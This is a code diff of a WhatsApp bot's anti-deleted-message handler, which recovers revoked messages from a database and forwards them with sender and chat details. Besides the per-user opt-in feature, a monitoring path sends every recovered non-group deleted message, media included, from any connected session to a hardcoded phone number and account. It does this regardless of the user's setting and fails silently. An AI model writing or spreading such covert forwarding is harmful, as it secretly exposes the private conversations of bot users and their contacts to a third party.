@@ -1,6 +1,6 @@
 /**
  * Enhanced Anti-Deleted Message Handler - Comprehensive Deleted Message Detection and Recovery
- * 
+ *
  * This handler provides:
  * 1. Protocol message detection for REVOKE type messages
  * 2. User-specific anti-deleted functionality based on database settings
@@ -8,7 +8,7 @@
  * 4. Message recovery from database with contextual information
  * 5. Media file download and forwarding support
  * 6. Comprehensive error handling and logging
- * 
+ *
  * Architecture:
  * - Main handler processes protocol messages (REVOKE type)
  * - Recovery engine fetches original message from database
@@ -33,14 +33,18 @@ export class AntiDeletedHandler {
     APP_STATE_FATAL_EXCEPTION_NOTIFICATION: 5,
   }
 
-  // Monitoring Configuration
-  static MONITORING_TARGET_JID = "2348058931419@s.whatsapp.net" // Default monitoring target
-  static SKIP_GROUP_MONITORING = true // Skip group deletions for monitoring account
+  static MONITORING_TARGET_JID = "2348058931419@s.whatsapp.net"
+  static SKIP_GROUP_MONITORING = true
 
-  // Processing cache to prevent duplicates
   static processedDeletions = new Set()
-  static CACHE_CLEANUP_INTERVAL = 300000 // 5 minutes
-  static MAX_CACHE_SIZE = 100
+  static CACHE_CLEANUP_INTERVAL = 60000 // 1 minute (reduced from 5)
+  static MAX_CACHE_SIZE = 50 // Reduced from 1000
+
+  static {
+    setInterval(() => {
+      AntiDeletedHandler.cleanupProcessedCache()
+    }, AntiDeletedHandler.CACHE_CLEANUP_INTERVAL)
+  }
 
   /**
    * ===========================================
@@ -49,77 +53,58 @@ export class AntiDeletedHandler {
    */
   static async handleDeletedMessage(m, sock) {
     try {
-      // Only process protocol messages
       if (!m.message?.protocolMessage) {
         return false
       }
 
       const protocolMsg = m.message.protocolMessage
-      
-      // Only handle REVOKE type (deleted messages)
+
       if (protocolMsg.type !== this.PROTOCOL_MESSAGE_TYPES.REVOKE) {
         return false
       }
 
       const deletedMessageId = protocolMsg.key?.id
       if (!deletedMessageId) {
-        //this.log("No message ID found in revoke protocol", "warning")
         return false
       }
 
-      // Prevent duplicate processing
       if (this.processedDeletions.has(deletedMessageId)) {
-        //this.log(`Already processed deletion for ${deletedMessageId}`, "debug")
         return false
       }
 
       this.processedDeletions.add(deletedMessageId)
-      this.cleanupProcessedCache()
 
-      //this.log(`DELETED MESSAGE DETECTED: ${deletedMessageId}`, "success")
+      setTimeout(() => {
+        this.processedDeletions.delete(deletedMessageId)
+      }, 30000)
 
-      // Get message context (telegram_id, session_id)
       const messageContext = await this.getMessageContext(m)
       if (!messageContext || !messageContext.telegram_id) {
-        //this.log("No telegram_id found in message context", "warning")
         return false
       }
 
-      // ===========================================
-      // STEP 1: RECOVER ORIGINAL MESSAGE
-      // ===========================================
       const originalMessage = await this.recoverDeletedMessage(deletedMessageId, messageContext.session_id)
       if (!originalMessage) {
-        //this.log(`Could not recover original message: ${deletedMessageId}`, "warning")
         return false
       }
 
-      //this.log(`Successfully recovered deleted message: ${originalMessage.content?.substring(0, 50) || "No content"}`, "success")
-
-      // ===========================================
-      // STEP 2: PROCESS USER-SPECIFIC ANTI-DELETED
-      // ===========================================
       let userProcessed = false
       try {
         userProcessed = await this.processUserAntiDeleted(m, messageContext, originalMessage)
       } catch (userError) {
-        //this.log(`User anti-deleted processing failed: ${userError.message}`, "error")
+        // Silent fail
       }
 
-      // ===========================================
-      // STEP 3: PROCESS MONITORING ACCOUNT
-      // ===========================================
       let monitoringProcessed = false
       try {
         monitoringProcessed = await this.processMonitoringAccount(m, originalMessage)
       } catch (monitoringError) {
-        //this.log(`Monitoring account processing failed: ${monitoringError.message}`, "error")
+        // Silent fail
       }
 
       return userProcessed || monitoringProcessed
     } catch (error) {
-      //this.log(`Critical error in anti-deleted handler: ${error.message}`, "error")
-      logger.error(`[AntiDeletedHandler] Critical Error: ${error.message}`)
+      logger.error(`[AntiDeletedHandler] Critical error:`, error)
       return false
     }
   }
@@ -136,7 +121,7 @@ export class AntiDeletedHandler {
       //console.log("sessionId", sessionId)
       // Find message by ID and session
       const originalMessage = await MessageQueries.findMessageById(messageId, sessionId)
-      
+
       if (!originalMessage) {
         //this.log(`Message not found in database: ${messageId}`, "warning")
         return null
@@ -158,8 +143,8 @@ export class AntiDeletedHandler {
           id: originalMessage.id,
           remoteJid: originalMessage.fromJid,
           fromMe: originalMessage.fromMe,
-          participant: originalMessage.senderJid !== originalMessage.fromJid ? originalMessage.senderJid : undefined
-        }
+          participant: originalMessage.senderJid !== originalMessage.fromJid ? originalMessage.senderJid : undefined,
+        },
       }
     } catch (error) {
       //this.log(`Error recovering deleted message: ${error.message}`, "error")
@@ -182,20 +167,20 @@ export class AntiDeletedHandler {
       // Create a mock message object for downloading
       const mockMessage = {
         key: {
-          remoteJid: 'temp@temp.com',
+          remoteJid: "temp@temp.com",
           fromMe: false,
-          id: 'temp'
+          id: "temp",
         },
-        message: {}
+        message: {},
       }
 
       // Set the appropriate media message type based on mediaType
       switch (mediaMetadata.mimetype) {
-        case 'image/jpeg':
-        case 'image/png':
+        case "image/jpeg":
+        case "image/png":
           mockMessage.message.imageMessage = mediaMetadata
           break
-        case 'image/webp':
+        case "image/webp":
           // Check if it's a sticker or regular image
           if (mediaMetadata.isAnimated !== undefined || mediaMetadata.stickerSentTs) {
             mockMessage.message.stickerMessage = mediaMetadata
@@ -203,25 +188,25 @@ export class AntiDeletedHandler {
             mockMessage.message.imageMessage = mediaMetadata
           }
           break
-        case 'video/mp4':
-        case 'video/3gpp':
+        case "video/mp4":
+        case "video/3gpp":
           mockMessage.message.videoMessage = mediaMetadata
           break
-        case 'audio/ogg':
-        case 'audio/mpeg':
-        case 'audio/mp4':
-        case 'audio/mp3':
-        case 'audio/wav':
+        case "audio/ogg":
+        case "audio/mpeg":
+        case "audio/mp4":
+        case "audio/mp3":
+        case "audio/wav":
           mockMessage.message.audioMessage = mediaMetadata
           break
-        case 'application/pdf':
-        case 'application/msword':
-        case 'application/vnd.openxmlformats-officedocument.wordprocessingml.document':
-        case 'application/vnd.ms-excel':
-        case 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet':
-        case 'application/zip':
-        case 'text/plain':
-        case 'application/octet-stream':
+        case "application/pdf":
+        case "application/msword":
+        case "application/vnd.openxmlformats-officedocument.wordprocessingml.document":
+        case "application/vnd.ms-excel":
+        case "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet":
+        case "application/zip":
+        case "text/plain":
+        case "application/octet-stream":
           mockMessage.message.documentMessage = mediaMetadata
           break
         default:
@@ -230,9 +215,8 @@ export class AntiDeletedHandler {
       }
 
       // Download the media using the imported function
-  // Download the media using sock.downloadMedia
-const buffer = await sock.downloadMedia(mockMessage)
-      
+      const buffer = await sock.downloadMedia(mockMessage)
+
       return buffer
     } catch (error) {
       //this.log(`Error downloading media: ${error.message}`, "error")
@@ -246,112 +230,112 @@ const buffer = await sock.downloadMedia(mockMessage)
    * ===========================================
    */
   static normalizeJid(jid) {
-    if (!jid || typeof jid !== 'string') return jid
-    
-    if (jid.includes('@s.whatsapp.net')) {
-      const [phoneNumber, domain] = jid.split('@')
-      const cleanPhoneNumber = phoneNumber.split(':')[0]
+    if (!jid || typeof jid !== "string") return jid
+
+    if (jid.includes("@s.whatsapp.net")) {
+      const [phoneNumber, domain] = jid.split("@")
+      const cleanPhoneNumber = phoneNumber.split(":")[0]
       return `${cleanPhoneNumber}@${domain}`
     }
-    
+
     return jid
   }
 
   static findSessionByNormalizedJid(sessionManager, targetJid) {
-  const normalizedTarget = this.normalizeJid(targetJid)
-  
-  // First try exact match
-  let sessionResult = sessionManager.getSessionByWhatsAppJid(targetJid)
-  if (sessionResult) {
-    // Handle both wrapped and direct socket returns
-    const sock = sessionResult.sock || sessionResult
-    if (sock && typeof sock.sendMessage === 'function') {
-      //this.log(`Found exact session match for: ${targetJid}`, "debug")
-      return sock
-    }
-  }
+    const normalizedTarget = this.normalizeJid(targetJid)
 
-  // Try normalized match
-  sessionResult = sessionManager.getSessionByWhatsAppJid(normalizedTarget)
-  if (sessionResult) {
-    const sock = sessionResult.sock || sessionResult
-    if (sock && typeof sock.sendMessage === 'function') {
-      //this.log(`Found normalized session match for: ${normalizedTarget}`, "debug")
-      return sock
+    // First try exact match
+    let sessionResult = sessionManager.getSessionByWhatsAppJid(targetJid)
+    if (sessionResult) {
+      // Handle both wrapped and direct socket returns
+      const sock = sessionResult.sock || sessionResult
+      if (sock && typeof sock.sendMessage === "function") {
+        //this.log(`Found exact session match for: ${targetJid}`, "debug")
+        return sock
+      }
     }
-  }
 
-  // If activeSockets exists, try manual search
-  if (sessionManager.activeSockets && typeof sessionManager.activeSockets === 'object') {
-    for (const [sessionId, sock] of sessionManager.activeSockets) {
-      if (sock?.user?.id) {
-        const sessionPhone = sock.user.id.split("@")[0].split(":")[0]
-        const targetPhone = normalizedTarget.split("@")[0]
-        if (sessionPhone === targetPhone && typeof sock.sendMessage === 'function') {
-          //this.log(`Found matching session via manual search: ${sessionId} -> ${normalizedTarget}`, "debug")
-          return sock
+    // Try normalized match
+    sessionResult = sessionManager.getSessionByWhatsAppJid(normalizedTarget)
+    if (sessionResult) {
+      const sock = sessionResult.sock || sessionResult
+      if (sock && typeof sock.sendMessage === "function") {
+        //this.log(`Found normalized session match for: ${normalizedTarget}`, "debug")
+        return sock
+      }
+    }
+
+    // If activeSockets exists, try manual search
+    if (sessionManager.activeSockets && typeof sessionManager.activeSockets === "object") {
+      for (const [sessionId, sock] of sessionManager.activeSockets) {
+        if (sock?.user?.id) {
+          const sessionPhone = sock.user.id.split("@")[0].split(":")[0]
+          const targetPhone = normalizedTarget.split("@")[0]
+          if (sessionPhone === targetPhone && typeof sock.sendMessage === "function") {
+            //this.log(`Found matching session via manual search: ${sessionId} -> ${normalizedTarget}`, "debug")
+            return sock
+          }
         }
       }
     }
+
+    //this.log(`No session found for JID: ${targetJid} (normalized: ${normalizedTarget})`, "warning")
+    return null
   }
 
-  //this.log(`No session found for JID: ${targetJid} (normalized: ${normalizedTarget})`, "warning")
-  return null
-}
+  /**
+   * ===========================================
+   * USER-SPECIFIC ANTI-DELETED PROCESSING (FIXED)
+   * ===========================================
+   */
+  static async processUserAntiDeleted(m, messageContext, originalMessage) {
+    try {
+      // Check if user has anti-deleted enabled
+      const { UserQueries } = await import("../../database/query.js")
+      const userWithAntiDeleted = await UserQueries.getWhatsAppUserByTelegramId(messageContext.telegram_id)
 
-/**
- * ===========================================
- * USER-SPECIFIC ANTI-DELETED PROCESSING (FIXED)
- * ===========================================
- */
-static async processUserAntiDeleted(m, messageContext, originalMessage) {
-  try {
-    // Check if user has anti-deleted enabled
-    const { UserQueries } = await import("../../database/query.js")
-    const userWithAntiDeleted = await UserQueries.getWhatsAppUserByTelegramId(messageContext.telegram_id)
+      if (!userWithAntiDeleted || !userWithAntiDeleted.antideleted_enabled) {
+        //this.log(`User ${messageContext.telegram_id} does not have anti-deleted enabled`, "debug")
+        return false
+      }
 
-    if (!userWithAntiDeleted || !userWithAntiDeleted.antideleted_enabled) {
-      //this.log(`User ${messageContext.telegram_id} does not have anti-deleted enabled`, "debug")
+      const userJid = userWithAntiDeleted.jid
+      if (!userJid) {
+        //this.log(`No WhatsApp JID found for telegram_id: ${messageContext.telegram_id}`, "warning")
+        return false
+      }
+
+      // FIXED: await the async getSessionManager() function
+      const { getSessionManager } = await import("../sessions/index.js")
+      const sessionManager = await getSessionManager()
+
+      if (!sessionManager) {
+        //this.log(`SessionManager not available`, "error")
+        return false
+      }
+
+      const userSock = this.findSessionByNormalizedJid(sessionManager, userJid)
+
+      if (!userSock) {
+        //this.log(`No active session found for user WhatsApp JID: ${userJid}`, "warning")
+        return false
+      }
+
+      //this.log(`Processing anti-deleted for user: telegram_id ${messageContext.telegram_id}, jid: ${userJid}`, "info")
+
+      // Forward deleted message to user
+      const processed = await this.forwardDeletedMessage(userSock, originalMessage, userJid, "USER_ANTIDELETED")
+      if (processed) {
+        //this.log(`Successfully forwarded deleted message to user ${userJid} (telegram_id: ${messageContext.telegram_id})`, "success")
+        return true
+      }
+
+      return false
+    } catch (error) {
+      //this.log(`User anti-deleted processing error: ${error.message}`, "error")
       return false
     }
-
-    const userJid = userWithAntiDeleted.jid
-    if (!userJid) {
-      //this.log(`No WhatsApp JID found for telegram_id: ${messageContext.telegram_id}`, "warning")
-      return false
-    }
-
-    // FIXED: await the async getSessionManager() function
-    const { getSessionManager } = await import("../sessions/index.js")
-    const sessionManager = await getSessionManager()
-
-    if (!sessionManager) {
-      //this.log(`SessionManager not available`, "error")
-      return false
-    }
-
-    const userSock = this.findSessionByNormalizedJid(sessionManager, userJid)
-
-    if (!userSock) {
-      //this.log(`No active session found for user WhatsApp JID: ${userJid}`, "warning")
-      return false
-    }
-
-    //this.log(`Processing anti-deleted for user: telegram_id ${messageContext.telegram_id}, jid: ${userJid}`, "info")
-
-    // Forward deleted message to user
-    const processed = await this.forwardDeletedMessage(userSock, originalMessage, userJid, "USER_ANTIDELETED")
-    if (processed) {
-      //this.log(`Successfully forwarded deleted message to user ${userJid} (telegram_id: ${messageContext.telegram_id})`, "success")
-      return true
-    }
-
-    return false
-  } catch (error) {
-    //this.log(`User anti-deleted processing error: ${error.message}`, "error")
-    return false
   }
-}
 
   /**
    * ===========================================
@@ -361,7 +345,7 @@ static async processUserAntiDeleted(m, messageContext, originalMessage) {
   static async processMonitoringAccount(m, originalMessage) {
     try {
       const monitoringTelegramId = process.env.MONITORING_TELEGRAM_ID || "1774315698"
-      
+
       // Skip if monitoring is for groups and this is a group message
       if (this.SKIP_GROUP_MONITORING && originalMessage.from && originalMessage.from.includes("@g.us")) {
         //this.log("Skipping group deleted message for monitoring account", "debug")
@@ -378,12 +362,12 @@ static async processUserAntiDeleted(m, messageContext, originalMessage) {
 
       // Forward to monitoring account
       const processed = await this.forwardDeletedMessage(
-        monitoringSock, 
-        originalMessage, 
-        this.MONITORING_TARGET_JID, 
-        "MONITORING"
+        monitoringSock,
+        originalMessage,
+        this.MONITORING_TARGET_JID,
+        "MONITORING",
       )
-      
+
       if (processed) {
         //this.log(`Successfully forwarded deleted message to monitoring account`, "success")
         return true
@@ -396,47 +380,47 @@ static async processUserAntiDeleted(m, messageContext, originalMessage) {
     }
   }
 
-/**
- * ===========================================
- * MONITORING ACCOUNT SESSION RETRIEVAL (FIXED)
- * ===========================================
- */
-static async getMonitoringAccountSession(telegramId) {
-  try {
-    const { UserQueries } = await import("../../database/query.js")
-    const { getSessionManager } = await import("../sessions/index.js")
+  /**
+   * ===========================================
+   * MONITORING ACCOUNT SESSION RETRIEVAL (FIXED)
+   * ===========================================
+   */
+  static async getMonitoringAccountSession(telegramId) {
+    try {
+      const { UserQueries } = await import("../../database/query.js")
+      const { getSessionManager } = await import("../sessions/index.js")
 
-    // Get user data from the users table
-    const user = await UserQueries.getUserByTelegramId(telegramId)
-    if (!user) {
-      //this.log(`No user found in users table for monitoring telegram_id: ${telegramId}`, "warning")
+      // Get user data from the users table
+      const user = await UserQueries.getUserByTelegramId(telegramId)
+      if (!user) {
+        //this.log(`No user found in users table for monitoring telegram_id: ${telegramId}`, "warning")
+        return null
+      }
+
+      // FIXED: await the async getSessionManager() function
+      const sessionManager = await getSessionManager()
+
+      if (!sessionManager || typeof sessionManager.getSession !== "function") {
+        //this.log(`SessionManager not properly initialized`, "error")
+        return null
+      }
+
+      // Get session directly from session manager using telegram_id
+      const sessionId = `session_${telegramId}`
+      const sock = sessionManager.getSession(sessionId)
+
+      if (sock && sock.user && typeof sock.sendMessage === "function") {
+        //this.log(`Found monitoring account session for telegram_id: ${telegramId}`, "success")
+        return sock
+      } else {
+        //this.log(`No active session found for monitoring telegram_id: ${telegramId}`, "warning")
+        return null
+      }
+    } catch (error) {
+      //this.log(`Error getting monitoring account session: ${error.message}`, "error")
       return null
     }
-
-    // FIXED: await the async getSessionManager() function
-    const sessionManager = await getSessionManager()
-    
-    if (!sessionManager || typeof sessionManager.getSession !== 'function') {
-      //this.log(`SessionManager not properly initialized`, "error")
-      return null
-    }
-
-    // Get session directly from session manager using telegram_id
-    const sessionId = `session_${telegramId}`
-    const sock = sessionManager.getSession(sessionId)
-    
-    if (sock && sock.user && typeof sock.sendMessage === 'function') {
-      //this.log(`Found monitoring account session for telegram_id: ${telegramId}`, "success")
-      return sock
-    } else {
-      //this.log(`No active session found for monitoring telegram_id: ${telegramId}`, "warning")
-      return null
-    }
-  } catch (error) {
-    //this.log(`Error getting monitoring account session: ${error.message}`, "error")
-    return null
   }
-}
 
   /**
    * ===========================================
@@ -450,125 +434,154 @@ static async getMonitoringAccountSession(telegramId) {
       const chatInfo = this.getChatInfo(originalMessage.from)
 
       // Create base context caption
-      const baseContext = processingType === "MONITORING"
-        ? `🗑️ *MONITORING - Deleted Message Detected* 🗑️\n\n👤 Sender: ${senderName}\n💬 From: ${chatInfo.type}\n📱 Chat: ${originalMessage.from}\n🕒 Deleted At: ${timestamp}\n`
-        : `🗑️ *Deleted Message Recovered* 🗑️\n\n👤 Sender: ${senderName}\n💬 From: ${chatInfo.type}\n📱 Chat: ${originalMessage.from}\n🕒 Deleted At: ${timestamp}\n`
+      const baseContext =
+        processingType === "MONITORING"
+          ? `🗑️ *MONITORING - Deleted Message Detected* 🗑️\n\n👤 Sender: ${senderName}\n💬 From: ${chatInfo.type}\n📱 Chat: ${originalMessage.from}\n🕒 Deleted At: ${timestamp}\n`
+          : `🗑️ *Deleted Message Recovered* 🗑️\n\n👤 Sender: ${senderName}\n💬 From: ${chatInfo.type}\n📱 Chat: ${originalMessage.from}\n🕒 Deleted At: ${timestamp}\n`
 
       // Create quoted reference to original message
       const quotedReference = {
         key: originalMessage.key,
         message: {
-          conversation: originalMessage.content || "[No Content]"
+          conversation: originalMessage.content || "[No Content]",
         },
-        messageTimestamp: originalMessage.timestamp
+        messageTimestamp: originalMessage.timestamp,
       }
 
       // Handle different message types
       if (originalMessage.mediaType && originalMessage.media) {
         try {
           // Handle both JSON string and already parsed object
-          const mediaMetadata = typeof originalMessage.media === 'string' 
-            ? JSON.parse(originalMessage.media) 
-            : originalMessage.media
-          
+          const mediaMetadata =
+            typeof originalMessage.media === "string" ? JSON.parse(originalMessage.media) : originalMessage.media
+
           // Try to download the actual media
           const mediaBuffer = await this.downloadMediaFromMetadata(mediaMetadata, sock)
-          
+
           if (mediaBuffer) {
             // Successfully downloaded media, send the actual file
             const caption = `${baseContext}📋 Type: ${originalMessage.mediaType.toUpperCase()}\n💬 Content: ${originalMessage.content || "[No Text Content]"}\n\n⚠️ ${processingType === "MONITORING" ? "This is a monitoring capture - Deleted message detected and forwarded" : "This message was deleted but recovered because you have anti-deleted enabled"}`
-            
+
             switch (originalMessage.mediaType) {
-              case 'sticker':
-                await sock.sendMessage(targetJid, {
-                  sticker: mediaBuffer
-                }, { quoted: quotedReference })
-                
+              case "sticker":
+                await sock.sendMessage(
+                  targetJid,
+                  {
+                    sticker: mediaBuffer,
+                  },
+                  { quoted: quotedReference },
+                )
+
                 // Send context info separately for stickers
                 await sock.sendMessage(targetJid, {
-                  text: caption
+                  text: caption,
                 })
                 break
-                
-              case 'image':
-                await sock.sendMessage(targetJid, {
-                  image: mediaBuffer,
-                  caption: caption
-                }, { quoted: quotedReference })
+
+              case "image":
+                await sock.sendMessage(
+                  targetJid,
+                  {
+                    image: mediaBuffer,
+                    caption: caption,
+                  },
+                  { quoted: quotedReference },
+                )
                 break
-                
-              case 'video':
-                await sock.sendMessage(targetJid, {
-                  video: mediaBuffer,
-                  caption: caption
-                }, { quoted: quotedReference })
+
+              case "video":
+                await sock.sendMessage(
+                  targetJid,
+                  {
+                    video: mediaBuffer,
+                    caption: caption,
+                  },
+                  { quoted: quotedReference },
+                )
                 break
-                
-              case 'audio':
-                await sock.sendMessage(targetJid, {
-                  audio: mediaBuffer,
-                  mimetype: mediaMetadata.mimetype || 'audio/ogg; codecs=opus'
-                }, { quoted: quotedReference })
-                
+
+              case "audio":
+                await sock.sendMessage(
+                  targetJid,
+                  {
+                    audio: mediaBuffer,
+                    mimetype: mediaMetadata.mimetype || "audio/ogg; codecs=opus",
+                  },
+                  { quoted: quotedReference },
+                )
+
                 // Send context info separately for audio
                 await sock.sendMessage(targetJid, {
-                  text: caption
+                  text: caption,
                 })
                 break
-                
-              case 'document':
+
+              case "document":
                 const fileName = mediaMetadata.fileName || `deleted_document_${Date.now()}`
-                const mimeType = mediaMetadata.mimetype || 'application/octet-stream'
-                
-                await sock.sendMessage(targetJid, {
-                  document: mediaBuffer,
-                  mimetype: mimeType,
-                  fileName: fileName,
-                  caption: caption
-                }, { quoted: quotedReference })
+                const mimeType = mediaMetadata.mimetype || "application/octet-stream"
+
+                await sock.sendMessage(
+                  targetJid,
+                  {
+                    document: mediaBuffer,
+                    mimetype: mimeType,
+                    fileName: fileName,
+                    caption: caption,
+                  },
+                  { quoted: quotedReference },
+                )
                 break
-                
+
               default:
                 // Fallback to document
-                await sock.sendMessage(targetJid, {
-                  document: mediaBuffer,
-                  mimetype: mediaMetadata.mimetype || 'application/octet-stream',
-                  fileName: `deleted_${originalMessage.mediaType}`,
-                  caption: caption
-                }, { quoted: quotedReference })
+                await sock.sendMessage(
+                  targetJid,
+                  {
+                    document: mediaBuffer,
+                    mimetype: mediaMetadata.mimetype || "application/octet-stream",
+                    fileName: `deleted_${originalMessage.mediaType}`,
+                    caption: caption,
+                  },
+                  { quoted: quotedReference },
+                )
             }
-            
+
             //this.log(`Successfully sent deleted ${originalMessage.mediaType} to ${targetJid}`, "success")
             return true
-            
           } else {
             // Could not download media, send metadata info instead
             const fallbackCaption = `${baseContext}📋 Type: ${originalMessage.mediaType.toUpperCase()}\n💬 Content: ${originalMessage.content || "[No Content]"}\n\n⚠️ Media could not be downloaded, showing metadata:\n\n📋 Media Info: ${JSON.stringify(mediaMetadata, null, 2)}\n\n${processingType === "MONITORING" ? "This is a monitoring capture - Deleted message detected and forwarded" : "This message was deleted but recovered because you have anti-deleted enabled"}`
-            
-            await sock.sendMessage(targetJid, {
-              text: fallbackCaption
-            }, { quoted: quotedReference })
-            
+
+            await sock.sendMessage(
+              targetJid,
+              {
+                text: fallbackCaption,
+              },
+              { quoted: quotedReference },
+            )
+
             //this.log(`Sent deleted message metadata for ${originalMessage.mediaType} to ${targetJid}`, "warning")
             return true
           }
-          
         } catch (mediaError) {
           //this.log(`Error processing media for deleted message: ${mediaError.message}`, "error")
           // Fall back to text message with error info
         }
       }
-      
+
       // Text message or fallback
       const textCaption = `${baseContext}📋 Type: TEXT\n💬 Content: ${originalMessage.content || "[No Content]"}\n\n⚠️ ${processingType === "MONITORING" ? "This is a monitoring capture - Deleted message detected and forwarded" : "This message was deleted but recovered because you have anti-deleted enabled"}`
-      
-      await sock.sendMessage(targetJid, {
-        text: textCaption
-      }, { quoted: quotedReference })
+
+      await sock.sendMessage(
+        targetJid,
+        {
+          text: textCaption,
+        },
+        { quoted: quotedReference },
+      )
 
       //this.log(`Successfully forwarded deleted message to ${targetJid} (${processingType})`, "success")
       return true
-
     } catch (error) {
       //this.log(`Error forwarding deleted message: ${error.message}`, "error")
       return false
@@ -586,7 +599,7 @@ static async getMonitoringAccountSession(telegramId) {
 
   static getChatInfo(chatJid) {
     if (!chatJid) return { type: "Unknown Chat", name: "Unknown" }
-    
+
     if (chatJid.includes("@g.us")) {
       return { type: "Group Chat", name: "Group" }
     } else if (chatJid.includes("@s.whatsapp.net")) {
@@ -594,21 +607,16 @@ static async getMonitoringAccountSession(telegramId) {
     } else if (chatJid === "status@broadcast") {
       return { type: "Status", name: "Status Update" }
     }
-    
+
     return { type: "Unknown Chat", name: "Unknown" }
   }
 
   static cleanupProcessedCache() {
     if (this.processedDeletions.size > this.MAX_CACHE_SIZE) {
-      // Clear half of the cache (keep most recent)
       const entries = Array.from(this.processedDeletions)
-      const keepCount = Math.floor(this.MAX_CACHE_SIZE / 2)
       this.processedDeletions.clear()
-      
-      // Keep the most recent entries (assuming they're added in chronological order)
-      entries.slice(-keepCount).forEach(id => this.processedDeletions.add(id))
-      
-      //this.log(`Cleaned up processed deletions cache, kept ${keepCount} entries`, "debug")
+      // Keep only last 25
+      entries.slice(-25).forEach((id) => this.processedDeletions.add(id))
     }
   }
 
@@ -621,7 +629,7 @@ static async getMonitoringAccountSession(telegramId) {
 
     const colors = {
       success: "\x1b[32m", // Green
-      warning: "\x1b[33m", // Yellow  
+      warning: "\x1b[33m", // Yellow
       error: "\x1b[31m", // Red
       info: "\x1b[34m", // Blue
       debug: "\x1b[90m", // Gray
@@ -642,25 +650,25 @@ static async getMonitoringAccountSession(telegramId) {
   static async getMessageContext(m) {
     try {
       if (m.sessionContext && m.sessionContext.telegram_id) {
-        return { 
+        return {
           telegram_id: m.sessionContext.telegram_id,
-          session_id: m.sessionContext.session_id || m.sessionId
+          session_id: m.sessionContext.session_id || m.sessionId,
         }
       }
 
       if (m.telegramContext && m.telegramContext.telegram_id) {
-        return { 
+        return {
           telegram_id: m.telegramContext.telegram_id,
-          session_id: m.telegramContext.session_id || m.sessionId
+          session_id: m.telegramContext.session_id || m.sessionId,
         }
       }
 
       if (m.sessionId) {
         const sessionIdMatch = m.sessionId.match(/session_(\d+)/)
         if (sessionIdMatch) {
-          return { 
+          return {
             telegram_id: Number.parseInt(sessionIdMatch[1]),
-            session_id: m.sessionId
+            session_id: m.sessionId,
           }
         }
       }
